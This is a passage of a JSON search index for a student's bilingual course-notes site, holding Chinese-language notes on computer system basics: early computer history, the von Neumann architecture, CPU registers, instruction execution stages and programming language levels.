{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"<p>This is a repository used to store notes from a student named Soaked majoring Computer Science (Elite).</p> <p>\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u653e Soaked \u7684\u7b14\u8bb0\u7684\u4ed3\u5e93\uff0cSoaked \u662f\u5357\u4eac\u5927\u5b66\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\uff08\u62d4\u5c16\u8ba1\u5212\uff09\u7684\u5b66\u751f\u3002</p> <p>In my first year in Nanjing University, I write notes with my pen. So I need some time to tidy up them. But I study hard to write digital notes since the third semester. </p> <p>\u6211\u5728\u5357\u4eac\u5927\u5b66\u7684\u7b2c\u4e00\u4e2a\u5b66\u5e74\uff0c\u662f\u4f7f\u7528\u624b\u5199\u6765\u8bb0\u5f55\u7b14\u8bb0\u7684\u3002\u6240\u4ee5\u6211\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u6765\u6574\u7406\u5b83\u4eec\u3002\u4e0d\u8fc7\u81ea\u7b2c\u4e09\u5b66\u671f\u8d77\uff0c\u6211\u5c31\u5f00\u59cb\u65e0\u7eb8\u5316\u5b66\u4e60\u4e86\u3002</p> <p>If you are interested in any result I made, you can contact me at puleacewoolf@foxmail.com.</p> <p>\u5982\u679c\u4f60\u5bf9\u4e8e\u5176\u4e2d\u4efb\u4f55\u5185\u5bb9\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u90ae\u7bb1\u5730\u5740\u8054\u7cfb\u6211\uff1apuleacewoolf@foxmail.com.</p> <p>Evidently they were pursuing science in order to know, and not for any utilitarian end...... Evidently then we do not seek it for the sake of any other advantage; but as the man is free, we say, who exists for his own sake and not for another's...... \u2014\u2014 Metaphysics, Aristotle, translated by W. D. Ross</p> <p>\uff08\u663e\u7136\uff09\u4ed6\u4eec\u4e3a\u6c42\u77e5\u800c\u4ece\u4e8b\u5b66\u672f\uff0c\u5e76\u65e0\u4efb\u4f55\u5b9e\u7528\u7684\u76ee\u7684\u2026\u2026\uff08\u5f88\u660e\u663e\uff0c\uff09\u6211\u4eec\u4e0d\u4e3a\u4efb\u4f55\u5176\u5b83\u5229\u76ca\u800c\u627e\u5bfb\u667a\u6167\uff1a\uff08\u6b63\u5982\u6211\u4eec\u6240\u8bf4\uff0c\uff09\u53ea\u56e0\u4eba\u672c\u81ea\u7531\uff0c\u4e3a\u81ea\u5df1\u7684\u751f\u5b58\u800c\u751f\u5b58\uff0c\u4e0d\u4e3a\u522b\u4eba\u7684\u751f\u5b58\u800c\u751f\u5b58\u2026\u2026</p> <p>\u2014\u2014\u300a\u5f62\u800c\u4e0a\u5b66\u300b\uff0c\u4e9a\u91cc\u58eb\u591a\u5fb7\uff08Aristotle\uff09\uff0cW. D. Ross \u8bd1</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/AAA-Index/","title":"AAA Index","text":"<p>\u5bf9\u4e8e\u8003\u8bd5\uff0c\u4ec5\u8003\u5bdf Ch01-09\uff0c\u5176\u4f59 Ch10-12 \u4e0d\u505a\u8003\u8bd5\u8981\u6c42\u3002</p> <p>\u5bf9\u4e8e\u8003\u8bd5\uff0c\u4e66\u4e0a\u5e26\u661f\u53f7\u7684\u7ae0\u8282\u4e0d\u8003\uff0c\u5176\u5305\u62ec Ch5.5 \u52a8\u6001\u94fe\u63a5\u548c Ch5.6 \u5e93\u6253\u6869\u673a\u5236\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/","title":"Ch01 \u8ba1\u7b97\u673a\u7cfb\u7edf\u6982\u8ff0","text":"<p>\u8fd9\u90e8\u5206\u5185\u5bb9\u5927\u591a\u5728 DLCO \u8bfe\u7a0b\u4e0a\u5b66\u8fc7\uff0c\u6545\u800c\u4f1a\u6bd4\u8f83\u4e00\u7b14\u5e26\u8fc7\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_1","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u57fa\u672c\u5de5\u4f5c\u539f\u7406","text":""},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_2","title":"\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\u57fa\u672c\u601d\u60f3","text":"<p>\u4e16\u754c\u4e0a\u7b2c\u4e00\u53f0\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u7535\u5b50\u6570\u5b57\u8ba1\u7b97\u673a\u662f 1935-1939 \u5e74\u95f4\u7531\u963f\u5854\u7eb3\u7d22\u592b\uff08John Vincent Atanasoff\uff09\u548c\u5176\u5408\u4f5c\u8005\u8d1d\u745e\uff08Clifford Berry\uff09\u4f7f\u7528 300 \u4e2a\u7535\u5b50\u7ba1\u7814\u5236\u6210\u529f\u7684 ABC\uff08Atanasoff-Berry Computer\uff09\uff0c\u4e0d\u8fc7\u8fd9\u53ea\u662f\u4e00\u4e2a\u6837\u673a\u3002</p> <p>1946 \u5e74 2 \u6708\uff0c\u83ab\u514b\u5229\uff08John W. Mauchly\uff09\u548c\u827e\u514b\u7279\uff08John Presper Eckert\uff09\u4f5c\u4e3a\u8d1f\u8d23\u4eba\uff0c\u771f\u6b63\u5b9e\u7528\u7684\u7535\u5b50\u6570\u5b57\u8ba1\u7b97\u673a ENIAC\uff08Electronical Numerical Integrator and Computer\uff09\u88ab\u7814\u5236\u51fa\u6765\uff0c\u5176\u8bbe\u8ba1\u601d\u60f3\u57fa\u672c\u6765\u6e90\u4e8e ABC\uff0c\u4e14\u548c ABC \u6709\u4e13\u5229\u4e4b\u4e89\u3002</p> <p>\u73b0\u5728\u56fd\u9645\u8ba1\u7b97\u673a\u754c\u516c\u8ba4\u963f\u5854\u7eb3\u7d22\u592b\u662f\u7b2c\u4e00\u53f0\u7535\u5b50\u8ba1\u7b97\u673a\u7684\u771f\u6b63\u53d1\u660e\u4eba\uff0c\u88ab\u79f0\u4e3a\u300c\u7535\u5b50\u8ba1\u7b97\u673a\u4e4b\u7236\u300d\u3002</p> <p>\u51af\u8bfa\u4f9d\u66fc\uff08John von Neumann\uff09\u5728\u7814\u5236 ENIAC \u7684\u540c\u65f6\uff0c\u8003\u8651\u7814\u5236\u53e6\u4e00\u53f0\u7535\u5b50\u8ba1\u7b97\u673a EDVAC\uff08Electronic Discrete Variable Automatic Computer\uff09\u30021945 \u5e74\uff0c\u4ed6\u4ee5\u300c\u5173\u4e8e EDVAC \u7684\u62a5\u544a\u8349\u6848\u300d\u4e3a\u9898\uff0c\u8d77\u8349\u4e86\u4e00\u7bc7\u62a5\u544a\uff0c\u53d1\u8868\u4e86\u5168\u65b0\u7684\u5b58\u50a8\u7a0b\u5e8f\uff08stored-program\uff09\u901a\u7528\u7535\u5b50\u8ba1\u7b97\u673a\u65b9\u6848\uff0c\u5ba3\u544a\u4e86\u73b0\u4ee3\u8ba1\u7b97\u673a\u7ed3\u6784\uff0c\u5373\u300c\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u300d\u7684\u8bde\u751f\u3002</p> <p>\u5b58\u50a8\u7a0b\u5e8f\u65b9\u5f0f\u7684\u57fa\u672c\u601d\u60f3\u662f\uff1a\u5fc5\u987b\u5c06\u4e8b\u5148\u7f16\u597d\u7684\u7a0b\u5e8f\u548c\u539f\u59cb\u6570\u636e\u9001\u5165\u4e3b\u5b58\u540e\u5f69\u80fd\u6267\u884c\u7a0b\u5e8f\uff0c\u4e00\u65e6\u7a0b\u5e8f\u88ab\u542f\u52a8\u6267\u884c\uff0c\u8ba1\u7b97\u673a\u80fd\u5728\u4e0d\u9700\u64cd\u4f5c\u4eba\u5458\u5e72\u9884\u4e0b\u81ea\u52a8\u5b8c\u6210\u9010\u6761\u6307\u4ee4\u53d6\u51fa\u548c\u6267\u884c\u7684\u4efb\u52a1\u3002</p> <p>\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\u57fa\u672c\u601d\u60f3\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u91c7\u7528\u300c\u5b58\u50a8\u7a0b\u5e8f\u300d\u5de5\u4f5c\u65b9\u5f0f\u3002</li> <li>\u8ba1\u7b97\u673a\u7531\u300c\u8fd0\u7b97\u5668\u300d\u3001\u300c\u63a7\u5236\u5668\u300d\u3001\u300c\u5b58\u50a8\u5668\u300d\u3001\u300c\u8f93\u5165\u8bbe\u5907\u300d\u548c\u300c\u8f93\u51fa\u8bbe\u5907\u300d\u4e94\u4e2a\u57fa\u672c\u90e8\u5206\u7ec4\u6210\u3002</li> <li>\u5b58\u50a8\u5668\u4e0d\u4ec5\u55ef\u90a3\u4e2a\u5b58\u653e\u6570\u636e\uff0c\u4e5f\u80fd\u5b58\u653e\u6307\u4ee4\uff0c\u6570\u636e\u548c\u6307\u4ee4\u5728\u5f62\u5f0f\u4e0a\u6ca1\u6709\u533a\u522b\uff0c\u4f46\u8ba1\u7b97\u673a\u80fd\u533a\u5206\u5b83\u4eec\uff1b\u63a7\u5236\u5668\u5e94\u80fd\u81ea\u52a8\u6267\u884c\u6307\u4ee4\uff1b\u8fd0\u7b97\u5668\u5e94\u80fd\u8fdb\u884c\u7b97\u672f\u8fd0\u7b97\uff0c\u4e5f\u80fd\u8fdb\u884c\u903b\u8f91\u8fd0\u7b97\uff1b\u64cd\u4f5c\u4eba\u5458\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u8bbe\u5907\u548c\u8f93\u51fa\u8bbe\u5907\u4f7f\u7528\u8ba1\u7b97\u673a\u3002</li> <li>\u8ba1\u7b97\u673a\u5185\u90e8\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u6307\u4ee4\u548c\u6570\u636e\uff1b\u6bcf\u6761\u6307\u4ee4\u7531\u64cd\u4f5c\u7801\u548c\u5730\u5740\u7801\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u64cd\u4f5c\u7801\u6307\u51fa\u64cd\u4f5c\u7c7b\u578b\uff0c\u5730\u5740\u7801\u6307\u51fa\u64cd\u4f5c\u6570\u7684\u5730\u5740\uff1b\u7531\u4e00\u4e32\u6307\u4ee4\u7ec4\u6210\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_3","title":"\u51af\u8bfa\u4f9d\u66fc\u673a\u7684\u57fa\u672c\u7ed3\u6784","text":"<p>\u6839\u636e\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\u57fa\u672c\u601d\u60f3\uff0c\u53ef\u4ee5\u7ed9\u51fa\u4e00\u4e2a\u6a21\u578b\u8ba1\u7b97\u673a\u7684\u57fa\u672c\u786c\u4ef6\u7ed3\u6784\u3002</p> <p>\u3010\u8fd9\u91cc\u6709\u4e00\u5f20\u56fe\u3011</p> <p>\u6a21\u578b\u673a\u4e2d\u4e3b\u8981\u5305\u62ec\uff1a</p> <ul> <li> <p>\u300c\u4e3b\u5b58\u300d\u6216\u300c\u5185\u5b58\u300d\uff1a\u7528\u6765\u5b58\u653e\u6307\u4ee4\u548c\u6570\u636e\u7684\u4e3b\u5b58\u50a8\u5668\u3002</p> </li> <li> <p>\u300c\u7b97\u672f\u903b\u8f91\u90e8\u4ef6\u300d\uff08ALU, Arithmetic Logic Unit\uff09\uff1a\u7528\u4e8e\u8fdb\u884c\u7b97\u672f\u903b\u8f91\u8fd0\u7b97\u7684\u8fd0\u7b97\u5668\u3002\u5176\u5728 ALU \u64cd\u4f5c\u63a7\u5236\u4fe1\u53f7 ALUop \u7684\u63a7\u5236\u4e0b\uff0cALU \u53ef\u4ee5\u5bf9\u8f93\u5165\u7aef A \u548c B \u8fdb\u884c\u4e0d\u540c\u7684\u8fd0\u7b97\uff0c\u5f97\u5230\u7ed3\u679c F.</p> </li> <li>\u300c\u63a7\u5236\u90e8\u4ef6\u300d\u6216\u300c\u63a7\u5236\u5668\u300d\uff08CU, Control Unit\uff09\uff1a\u7528\u4e8e\u81ea\u52a8\u9010\u6761\u53d6\u51fa\u6307\u4ee4\u5e76\u8fdb\u884c\u8bd1\u7801\u7684\u90e8\u4ef6\u3002</li> <li>\u300c\u8f93\u5165\u8bbe\u5907\u300d\u548c\u300c\u8f93\u51fa\u8bbe\u5907\u300d\uff1a\u7528\u4e8e\u7528\u6237\u4ea4\u4e92\u3002</li> </ul> <p>\u4e3a\u4e86\u66f4\u597d\u7684\u5b9e\u73b0\u5176\u7ed3\u6784\uff0c\u6211\u4eec\u5f15\u5165\u4ee5\u4e0b\u90e8\u4ef6\uff1a</p> <ul> <li>\u300c\u901a\u7528\u5bc4\u5b58\u5668\u7ec4\u300d\uff08GPRs, General Purpose Registers\uff09\uff1a\u7528\u4e8e\u4e34\u65f6\u5b58\u653e\u4ece\u4e3b\u5b58\u53d6\u6765\u7684\u6570\u636e\u6216\u8fd0\u7b97\u7684\u7ed3\u679c\u3002ALU \u4e24\u4e2a\u8f93\u5165\u7aef\u7684\u6570\u636e\u6765\u81ea\u901a\u7528\u5bc4\u5b58\u5668\u3002</li> <li>\u300c\u6807\u5fd7\u5bc4\u5b58\u5668\u300d\uff1a\u7528\u4e8e\u5b58\u653e ALU \u8fd0\u7b97\u7ed3\u679c\u4ea7\u751f\u7684\u6807\u5fd7\u4fe1\u606f\u3002</li> <li>\u300c\u6307\u4ee4\u5bc4\u5b58\u5668\u300d\uff08IR, Instruction Register\uff09\uff1a\u7528\u4e8e\u4e34\u65f6\u4fdd\u5b58\u4ece\u4e3b\u5b58\u53d6\u6765\u7684\u6307\u4ee4\u3002</li> <li>\u300c\u7a0b\u5e8f\u8ba1\u6570\u5668\u300d\uff08PC, Program Counter\uff09\uff1aCPU \u4e3a\u4e86\u81ea\u52a8\u6309\u5e8f\u8bfb\u53d6\u4e3b\u5b58\u4e2d\u7684\u6307\u4ee4\uff0c\u5728\u6267\u884c\u5f53\u524d\u6307\u4ee4\u7684\u8fc7\u7a0b\u4e2d\uff0c\u81ea\u52a8\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5e76\u9001 PC \u4fdd\u5b58\u3002</li> <li>\u300c\u4e2d\u592e\u5904\u7406\u5668\u300d\uff08CPU, Central Processing Unit\uff09\uff1a\u901a\u5e38\u628a\u63a7\u5236\u5668\u3001\u8fd0\u7b97\u5668\u548c\u5404\u7c7b\u5bc4\u5b58\u5668\u4e92\u8fde\u7ec4\u6210\u7684\u7535\u8def\u79f0\u4e3a CPU.</li> </ul> <p>CPU \u9700\u8981\u4ece\u901a\u7528\u5bc4\u5b58\u5668\u4e2d\u53d6\u6570\u636e\u5230 ALU \u4e2d\u8fdb\u884c\u8ba1\u7b97\uff0c\u6216\u628a ALU \u8ba1\u7b97\u7684\u7ed3\u679c\u4fdd\u5b58\u5230\u901a\u7528\u5bc4\u5b58\u5668\u4e2d\uff0c\u56e0\u6b64\u9700\u8981\u7ed9\u6bcf\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u7f16\u53f7\uff1b</p> <p>\u4e3b\u5b58\u4e2d\u6bcf\u4e2a\u5355\u5143\u4e5f\u9700\u8981\u7f16\u53f7\uff0c\u79f0\u4e3a\u300c\u4e3b\u5b58\u5355\u5143\u5730\u5740\u300d\uff0c\u7b80\u79f0\u300c\u4e3b\u5b58\u5730\u5740\u300d\u3002</p> <p>\u901a\u7528\u5bc4\u5b58\u5668\u548c\u4e3b\u5b58\u90fd\u5c5e\u4e8e\u5b58\u50a8\u90e8\u4ef6\uff0c\u8ba1\u7b97\u673a\u4e2d\u7684\u5b58\u50a8\u90e8\u4ef6\u4ece 0 \u5f00\u59cb\u7f16\u53f7\u3002</p> <p>\u4e3a\u4e86\u4ece\u4e3b\u5b58\u53d6\u6307\u4ee4\u548c\u6570\u636e\uff0cCPU \u9700\u8981\u901a\u8fc7\u4f20\u8f93\u4ecb\u8d28\u548c\u4e3b\u5b58\u76f8\u8fde\u3002\u901a\u5e38\u628a\u8fde\u63a5\u4e0d\u540c\u90e8\u4ef6\u8fdb\u884c\u4fe1\u606f\u4f20\u8f93\u7684\u4ecb\u8d28\u79f0\u4e3a\u300c\u603b\u7ebf\u300d\uff0c\u5176\u4e2d\u5305\u542b\u7528\u4e8e\u4f20\u8f93\u5730\u5740\u4fe1\u606f\u3001\u6570\u636e\u4fe1\u606f\u548c\u63a7\u5236\u4fe1\u606f\u7684\u300c\u5730\u5740\u7ebf\u300d\u3001\u300c\u6570\u636e\u7ebf\u300d\u548c\u300c\u63a7\u5236\u7ebf\u300d\u3002</p> <p>CPU \u8bbf\u95ee\u4e3b\u5b58\u65f6\uff0c\u9700\u5148\u5c06\u4e3b\u5b58\u5730\u5740\u3001\u8bfb\u5199\u547d\u4ee4\u5206\u522b\u53d1\u9001\u5230\u603b\u7ebf\u7684\u5730\u5740\u7ebf\u3001\u63a7\u5236\u7ebf\uff0c\u7136\u540e\u901a\u8fc7\u6570\u636e\u7ebf\u53d1\u9001\u6216\u63a5\u6536\u6570\u636e\u3002</p> <p>CPU\u53d1\u9001\u5230\u5730\u5740\u7ebf\u7684\u4e3b\u5b58\u5730\u5740\u5e94\u5148\u5b58\u653e\u5728\u300c\u4e3b\u5b58\u5730\u5740\u5bc4\u5b58\u5668\u300d\uff08MAR, Memory Address Register\uff09\u4e2d\uff0c\u53d1\u9001\u5230\u6570\u636e\u7ebf\u6216\u4ece\u6570\u636e\u7ebf\u83b7\u53d6\u7684\u4fe1\u606f\u5b58\u653e\u5728\u300c\u4e3b\u5b58\u6570\u636e\u5bc4\u5b58\u5668\u300d\uff08MDR, Memory Data Register\uff09\u4e2d\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_4","title":"\u7a0b\u5e8f\u548c\u6307\u4ee4\u7684\u6267\u884c\u8fc7\u7a0b","text":"<p>\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u5c31\u662f\u6240\u5305\u542b\u7684\u6307\u4ee4\u7684\u6267\u884c\u8fc7\u7a0b\u3002</p> <p>\u6307\u4ee4\uff08instruction\uff09\u662f\u4e00\u4e32 0/1 \u5e8f\u5217\uff0c\u7528\u4e8e\u6307\u793a CPU \u5b8c\u6210\u4e00\u4e2a\u7279\u5b9a\u7684\u539f\u5b50\u64cd\u4f5c\u3002</p> <p>\u6307\u4ee4\u901a\u5e38\u88ab\u5212\u5206\u4e3a\u82e5\u5e72\u4e2a\u5b57\u6bb5\uff0c\u5305\u542b\u64cd\u4f5c\u7801\u3001\u5730\u5740\u7801\u7b49\u3002\u300c\u64cd\u4f5c\u7801\u5b57\u6bb5\u300d\u6307\u51fa\u6307\u4ee4\u7684\u64cd\u4f5c\u7c7b\u578b\uff0c\u300c\u5730\u5740\u7801\u5b57\u6bb5\u300d\u6307\u51fa\u6307\u4ee4\u6240\u5904\u7406\u7684\u64cd\u4f5c\u6570\u7684\u5730\u5740\u3002</p> <p>\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\uff0c\u5bf9\u6307\u4ee4\u6267\u884c\u7ecf\u8fc7\u8fd9\u4e9b\u9636\u6bb5\uff1a</p> <ul> <li>\u6839\u636e PC \u53d6\u6307\u4ee4</li> <li>\u6307\u4ee4\u8bd1\u7801\uff0c\u66f4\u65b0 PC</li> <li>\u53d6\u64cd\u4f5c\u6570\u5e76\u6267\u884c</li> <li>\u9001\u7ed3\u679c</li> </ul> <p>\u4e00\u822c\u6765\u8bf4\u4f1a\u62c6\u89e3\u4e3a\u8fd9\u4e94\u4e2a\u9636\u6bb5\uff1a\u53d6\u6307\uff08IF\uff09\u3001\u8bd1\u7801\uff08ID\uff09\u3001\u6267\u884c\uff08EX\uff09\u3001\u8bbf\u5b58\uff08MEM\uff09\u3001\u5199\u56de\uff08WB\uff09\u3002</p> <p>\u6307\u4ee4\u6267\u884c\u5404\u9636\u6bb5\u90fd\u4f1a\u5305\u542b\u82e5\u5e72\u4e2a\u300c\u5fae\u64cd\u4f5c\u300d\uff0c\u5176\u9700\u8981\u76f8\u5e94\u7684\u63a7\u5236\u4fe1\u53f7\uff08control signal\uff09\u8fdb\u884c\u63a7\u5236\u3002</p> <p>\u901a\u5e38\uff0cCPU \u4e2d\u6240\u6709\u5fae\u64cd\u4f5c\u90fd\u7531\u59cb\u7ec8\u4fe1\u53f7\u8fdb\u884c\u5b9a\u65f6\u3002\u300c\u65f6\u949f\u4fe1\u53f7\u300d\uff08clock signal\uff09\u7684\u5bbd\u5ea6\u4e3a\u4e00\u4e2a\u300c\u65f6\u949f\u5468\u671f\u300d\uff08clock cycle\uff09\uff0c\u4e00\u6761\u6307\u4ee4\u7684\u6267\u884c\u65f6\u95f4\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u65f6\u949f\u5468\u671f\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_5","title":"\u7a0b\u5e8f\u7684\u5f00\u53d1\u4e0e\u8fd0\u884c","text":"<p>\u9996\u5148\uff0c\u5e94\u5c06\u5e94\u7528\u95ee\u9898\uff08\u4efb\u52a1\uff09\u8f6c\u5316\u4e3a\u300c\u7b97\u6cd5\u300d\uff08algorithm\uff09\u63cf\u8ff0\uff0c\u4f7f\u5e94\u7528\u95ee\u9898\u7684\u6c42\u89e3\u53d8\u4e3a\u6d41\u7a0b\u5316\u7684\u6e05\u6670\u6b65\u9aa4\uff0c\u5e76\u4fdd\u8bc1\u6b65\u9aa4\u6709\u9650\u3002\u4efb\u4f55\u4e00\u4e2a\u95ee\u9898\u90fd\u53ef\u80fd\u6709\u591a\u4e2a\u6c42\u89e3\u7b97\u6cd5\uff0c\u9700\u8981\u8fdb\u884c\u7b97\u6cd5\u5206\u6790\u4ee5\u786e\u5b9a\u7b97\u6cd5\u7684\uff0c\u7279\u522b\u662f\u5728\u65f6\u95f4\u548c\u7a7a\u95f4\u4e0a\u7684\uff0c\u9ad8\u6548\u6027\u3002</p> <p>\u5176\u6b21\uff0c\u5c06\u7b97\u6cd5\u8f6c\u6362\u4e3a\u7528\u7f16\u7a0b\u8bed\u8a00\u63cf\u8ff0\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u8f6c\u6362\u901a\u5e38\u662f\u7531\u7a0b\u5e8f\u5458\u8fdb\u884c\u7a0b\u5e8f\u8bbe\u8ba1\u3001\u624b\u5de5\u8fdb\u884c\u7684\u3002\u300c\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u300d\uff08programming language\uff09\u4e0e\u81ea\u7136\u8bed\u8a00\u4e0d\u540c\uff0c\u5176\u6709\u4e25\u683c\u7684\u6267\u884c\u987a\u5e8f\uff0c\u4e0d\u5b58\u5728\u4e8c\u4e49\u6027\uff0c\u4ece\u800c\u4fdd\u8bc1\u7a0b\u5e8f\u884c\u4e3a\u4e0e\u7b97\u6cd5\u63cf\u8ff0\u4e00\u81f4\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_6","title":"\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u548c\u7ffb\u8bd1\u7a0b\u5e8f","text":"<p>\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u53ef\u4ee5\u5206\u6210\u4e0d\u540c\u62bd\u8c61\u5c42\u7684\u3001\u9002\u7528\u4e8e\u4e0d\u540c\u9886\u57df\u7684\u3001\u91c7\u7528\u4e0d\u540c\u63cf\u8ff0\u7ed3\u6784\u7684\u7b49\u7b49\u3002\u4ece\u62bd\u8c61\u5c42\u6b21\u4e0a\u6765\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u300c\u9ad8\u7ea7\u8bed\u8a00\u300d\u548c\u300c\u4f4e\u7ea7\u8bed\u8a00\u300d\u4e24\u7c7b\u3002</p> <p>\u4f7f\u7528\u7279\u5b9a\u8ba1\u7b97\u673a\u89c4\u5b9a\u7684\u6307\u4ee4\u683c\u5f0f\u800c\u5f62\u6210\u7684 01 \u5e8f\u5217\u79f0\u4e3a\u300c\u673a\u5668\u8bed\u8a00\u300d\uff0c\u4f7f\u7528\u5176\u5199\u6210\u7684\u8ba1\u7b97\u673a\u80fd\u7406\u89e3\u548c\u6267\u884c\u7684\u7a0b\u5e8f\u79f0\u4e3a\u300c\u673a\u5668\u4ee3\u7801\u300d\u6216\u300c\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u300d\uff0c\u5176\u4e2d\u7684\u6bcf\u6761\u6307\u4ee4\u90fd\u7531 01 \u7ec4\u6210\uff0c\u79f0\u4e3a\u300c\u673a\u5668\u6307\u4ee4\u300d\u3002</p> <p>\u6700\u65e9\u4eba\u4eec\u91c7\u7528\u673a\u5668\u8bed\u8a00\u7f16\u5199\u7a0b\u5e8f\uff0c\u4f46\u53ef\u8bfb\u6027\u592a\u5dee\uff0c\u7ed9\u7a0b\u5e8f\u7684\u7f16\u5199\u548c\u9605\u8bfb\u5e26\u6765\u4e86\u6781\u5927\u56f0\u96be\u3002\u4eba\u4eec\u4e8e\u662f\u5f15\u5165\u4e86\u4e00\u79cd\u673a\u5668\u8bed\u8a00\u7684\u7b26\u53f7\u8868\u793a\u8bed\u8a00\uff0c\u5176\u901a\u8fc7\u7528\u7b80\u77ed\u7684\u82f1\u6587\u7b26\u53f7\u548c\u673a\u5668\u6307\u4ee4\u5efa\u7acb\u5bf9\u5e94\u5173\u7cfb\uff0c\u4ee5\u65b9\u4fbf\u7a0b\u5e8f\u5458\u7f16\u5199\u548c\u9605\u8bfb\u7a0b\u5e8f\uff0c\u8fd9\u79cd\u8bed\u8a00\u5c31\u88ab\u79f0\u4f5c\u300c\u6c47\u7f16\u8bed\u8a00\u300d\uff08assembly language\uff09\uff0c\u673a\u5668\u6307\u4ee4\u5bf9\u5e94\u7684\u7b26\u53f7\u8868\u793a\u79f0\u4e3a\u300c\u6c47\u7f16\u6307\u4ee4\u300d\u3002</p> <p>\u4f46\u662f\u8ba1\u7b97\u673a\u65e0\u6cd5\u7406\u89e3\u6c47\u7f16\u8bed\u8a00\uff0c\u6240\u4ee5\u300c\u6c47\u7f16\u8bed\u8a00\u6e90\u7a0b\u5e8f\u300d\u9700\u8981\u8f6c\u6362\u4e3a\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u624d\u80fd\u88ab\u6267\u884c\u3002\u6c47\u7f16\u6307\u4ee4\u548c\u5bf9\u5e94\u7684\u673a\u5668\u6307\u4ee4\u4e00\u4e00\u5bf9\u5e94\uff0c\u4e14\u90fd\u548c\u7279\u5b9a\u7684\u673a\u5668\u7ed3\u6784\u76f8\u5173\uff0c\u4e8c\u8005\u7edf\u79f0\u4e3a\u300c\u673a\u5668\u7ea7\u8bed\u8a00\u300d\uff08machine level language\uff09\u3002</p> <p>\u56e0\u673a\u5668\u7ea7\u8bed\u8a00\u6bcf\u6761\u6307\u4ee4\u529f\u80fd\u5f88\u7b80\u5355\uff0c\u63cf\u8ff0\u7a0b\u5e8f\u529f\u80fd\u65f6\u7ec6\u8282\u592a\u591a\uff0c\u4e3a\u6b64\u53d1\u660e\u4e86\u300c\u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u300d\uff08high level programming language\uff09\uff0c\u53c8\u79f0\u300c\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\u300d\uff0c\u5176\u662f\u6307\u9762\u5411\u7b97\u6cd5\u8bbe\u8ba1\u7684\uff0c\u8f83\u63a5\u8fd1\u4e8e\u65e5\u5e38\u82f1\u8bed\u4e66\u9762\u8bed\u8a00\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u3002</p> 